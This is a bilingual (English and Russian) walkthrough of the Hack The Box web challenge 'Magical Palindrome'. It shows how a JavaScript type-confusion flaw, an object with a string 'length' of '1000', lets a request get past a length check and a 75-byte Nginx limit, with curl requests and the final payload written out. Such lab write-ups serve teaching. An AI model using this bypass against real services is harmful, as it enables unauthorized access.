[English](#english) · [Русский](#русский)

---

## English

**Name -** Magical Palindrome

**Category -** Web

**Difficulty -** Very Easy

**Link -** https://app.hackthebox.com/challenges/Magical%20Palindrome

### Summary

The challenge presents a classic paradox, a Node.js backend requires an input string with a length of at least 1000 characters, while the Nginx reverse proxy in front of it limits the request body size to just 75 bytes. This makes a legitimate request impossible. The solution lies in exploiting a JavaScript type confusion vulnerability in the palindrome checking function. By sending a JSON object that mimics an array with specific properties (`"length": "1000"`, `"0": "a"`, `"999": "a"`), we can bypass both the length check and the internal palindrome logic, all within the 75-byte limit, to retrieve the flag.

---

### Recon (how I inspected the source)

After downloading the source code, I examined the file structure:

```
.
├── app
│   ├── index.html
│   ├── index.mjs
│   └── package.json
├── config
│   ├── nginx.conf
│   └── supervisord.conf
├── Dockerfile
├── flag.txt
└── start.sh
```

Studying the code revealed the central conflict:

1.  The Node.js application (`index.mjs`) in its `IsPalinDrome` function requires the input string's length to be at least 1000 characters:
    ```javascript
    if (string.length < 1000) {
        return 'Tootus Shortus';
    }
    ```
2.  The Nginx configuration (`nginx.conf`) restricts the request body to a maximum of 75 bytes:
    ```nginx
    client_max_body_size 75;
    ```
This creates a situation where sending a valid request is impossible through conventional means.

---

### Vulnerability Analysis

The key vulnerability is in the `IsPalinDrome` function. It expects a string as input but never actually verifies the type of the `string` variable.

```javascript
const IsPalinDrome = (string) => {
	if (string.length < 1000) {
		return 'Tootus Shortus';
	}

	for (const i of Array(string.length).keys()) {
		const original = string[i];
		const reverse = string[string.length - i - 1];

		if (original !== reverse || typeof original !== 'string') {
			return 'Notter Palindromer!!';
		}
	}

	return null;
}
```

In JavaScript, properties can be accessed on objects just as they are on arrays or strings. The function will happily work with any object that has a `.length` property and can be accessed with an index operator (`[]`).

---

### Crafting the Payload (Exploitation)

My first attempt was to send an object with a numeric length property:

```json
{
  "palindrome": {
    "length": 1000
  }
}
```
Let's test this theory with `curl`:
```bash
curl 'http://<IP>:<PORT>/' \
  -H 'Content-Type: application/json' \
  --data-raw '{"palindrome": {"length": 1000}}'
```
The server responded with: `Notter Palindromer!!`

This is logical because the loop `for (const i of Array(string.length).keys())` iterates from `i = 0` to `999`. On the first iteration, `string[0]` is `undefined`, causing the `typeof original !== 'string'` check to fail.

Here's the crucial insight: how does `Array()` behave with different types?
*   `Array(5)` creates `[ <5 empty items> ]` (an array of length 5).
*   `Array("5")` creates `[ '5' ]` (an array of length 1, whose only element is the string '5').

This is the key to the bypass!

1.  **Bypass the length check (`length < 1000`)**: We need `string.length` to be a value `x` such that `x < 1000` is false. The string `"1000"` is perfect, as it gets coerced into a number during the comparison, and `1000 < 1000` is `false`.
2.  **Bypass the loop check**:
    *   If `string.length` is `"1000"`, then `Array(string.length)` becomes `Array("1000")`.
    *   This creates the array `[ "1000" ]`, which has a length of 1.
    *   Therefore, the `for...of` loop will execute exactly once, for the index `i = 0`.
3.  **Satisfy the condition inside the loop**: For `i = 0`, we need the check `if (original !== reverse || typeof original !== 'string')` to fail.
    *   `original = string[i] = string[0]`.
    *   `reverse = string[string.length - i - 1] = string["1000" - 0 - 1] = string[999]`.
    *   We just need `string[0]` and `string[999]` to be identical strings.

This leads to the final payload, which:
*   Has a `length` property equal to the string `"1000"`.
*   Causes the loop to run only once for `i = 0`.
*   Has properties `"0"` and `"999"` that are identical strings to pass the loop's check.
*   Is well under the 75-byte limit.

```json
{"palindrome": {"length": "1000", "0": "a", "999": "a"}}
```

---

### Result and Proofs

Now, let's test the final payload:

```bash
┌──(vt729830㉿vt72983)-[~/k/web_magical_palindrome]
└─$ curl 'http://<IP>:<PORT>/' \
  -H 'Content-Type: application/json' \
  --data-raw '{"palindrome": {"length": "1000", "0": "a", "999": "a"}}'
Hii Harry!!! HTB{********}
```
And the flag is ours! (By the way, it's a funny number. Exactly 333, symbolizing the support of the Universe and confirmation that we are on the right path XD)

![flag proof](flag.png)

---

## Русский

[Go to English version](#english)

**Название -** Magical Palindrome

**Категория -** Web

**Сложность -** Very Easy

**Ссылка -** https://app.hackthebox.com/challenges/Magical%20Palindrome

---

## Краткое описание

Челлендж представляет собой классический парадокс, где бэкенд на Node.js требует на вход строку длиной не менее 1000 символов, в то время как обратный прокси-сервер Nginx перед ним ограничивает размер тела запроса всего до 75 байт. Это делает отправку легитимного запроса невозможной. Решение заключается в эксплуатации уязвимости путаницы типов (type confusion) в JavaScript в функции проверки палиндрома. Отправив JSON-объект, имитирующий массив с особыми свойствами (`"length": "1000"`, `"0": "a"`, `"999": "a"`), мы можем обойти как проверку длины, так и внутреннюю логику палиндрома, уложившись в лимит 75 байт, и получить флаг.

---

## Разведка (как я изучал исходники)

Скачав исходники, я увидел следующую структуру файлов:

```
.
├── app
│   ├── index.html
│   ├── index.mjs
│   └── package.json
├── config
│   ├── nginx.conf
│   └── supervisord.conf
├── Dockerfile
├── flag.txt
└── start.sh
```
Изучение кода выявило ключевой конфликт:

1.  Приложение Node.js (`index.mjs`) в функции `IsPalinDrome` требует, чтобы длина входной строки была не менее 1000 символов:
    ```javascript
    if (string.length < 1000) {
        return 'Tootus Shortus';
    }
    ```
2.  Конфигурация Nginx (`nginx.conf`) запрещает телу запроса быть больше 75 байт:
    ```nginx
    client_max_body_size 75;
    ```
Это создаёт парадокс, при котором невозможно отправить валидный запрос обычным способом.

---

## Анализ уязвимости

Ключевая уязвимость находится в функции `IsPalinDrome`. Она ожидает на вход строку, но на самом деле не проверяет тип переменной `string`.

```javascript
const IsPalinDrome = (string) => {
	if (string.length < 1000) {
		return 'Tootus Shortus';
	}

	for (const i of Array(string.length).keys()) {
		const original = string[i];
		const reverse = string[string.length - i - 1];

		if (original !== reverse || typeof original !== 'string') {
			return 'Notter Palindromer!!';
		}
	}

	return null;
}
```
В JavaScript к свойствам можно обращаться и у объектов, как у массивов или строк. Функция будет работать с любым объектом, у которого есть свойство `.length` и к которому можно применять оператор индексации `[]`.

---

## Создание пейлоада (Эксплуатация)

Моя первая попытка — передать объект с числовым свойством `length`:

```json
{
  "palindrome": {
    "length": 1000
  }
}
```
Проверим теорию с помощью `curl`:
```bash
curl 'http://<IP>:<PORT>/' \
  -H 'Content-Type: application/json' \
  --data-raw '{"palindrome": {"length": 1000}}'
```
Сервер вернул: `Notter Palindromer!!`

Это логично, ведь цикл `for (const i of Array(string.length).keys())` итерируется от `i = 0` до `999`. На первой же итерации `string[0]` оказывается `undefined`, из-за чего проверка `typeof original !== 'string'` проваливается.

А вот и ключевая догадка: как `Array()` ведёт себя с разными типами?
*   `Array(5)` создает `[ <5 empty items> ]` (массив длиной 5).
*   `Array("5")` создает `[ '5' ]` (массив длиной 1, где первый элемент — это строка '5').

Это и есть ключ к обходу!

1.  **Обход проверки длины (`length < 1000`)**: Нам нужно, чтобы `string.length` был таким значением `x`, что `x < 1000` является ложным. Строка `"1000"` подходит идеально, так как при сравнении она приводится к числу, и `1000 < 1000` — это `false`.
2.  **Обход проверки в цикле**:
    *   Если `string.length` равен `"1000"`, то `Array(string.length)` превратится в `Array("1000")`.
    *   Это создаст массив `[ "1000" ]`, длина которого равна 1.
    *   Значит, цикл `for...of` выполнится ровно один раз для индекса `i = 0`.
3.  **Удовлетворение условия в цикле**: Теперь нам нужно, чтобы для `i = 0` проверка `if (original !== reverse || typeof original !== 'string')` не сработала.
    *   `original = string[i] = string[0]`.
    *   `reverse = string[string.length - i - 1] = string["1000" - 0 - 1] = string[999]`.
    *   Нам нужно лишь, чтобы `string[0]` и `string[999]` были одинаковыми строками.

Так мы приходим к финальному пейлоаду, который:
*   Имеет свойство `length`, равное строке `"1000"`.
*   Заставляет цикл выполниться только один раз для `i = 0`.
*   Имеет свойства `"0"` и `"999"`, которые являются одинаковыми строками, чтобы пройти проверку внутри цикла.
*   Его общий размер намного меньше 75 байт.

```json
{"palindrome": {"length": "1000", "0": "a", "999": "a"}}
```

---

## Результат и доказательства

А теперь тестируем финальный пейлоад:

```bash
┌──(vt729830㉿vt72983)-[~/k/web_magical_palindrome]
└─$ curl 'http://<IP>:<PORT>/' \
  -H 'Content-Type: application/json' \
  --data-raw '{"palindrome": {"length": "1000", "0": "a", "999": "a"}}'
Hii Harry!!! HTB{********}
```
И флаг наш! (Кстати забавное число. Прям 333 символизирующий поддержку Вселенной и подтверждение того, что мы находимся на верном пути XD)

![flag proof](flag.png)
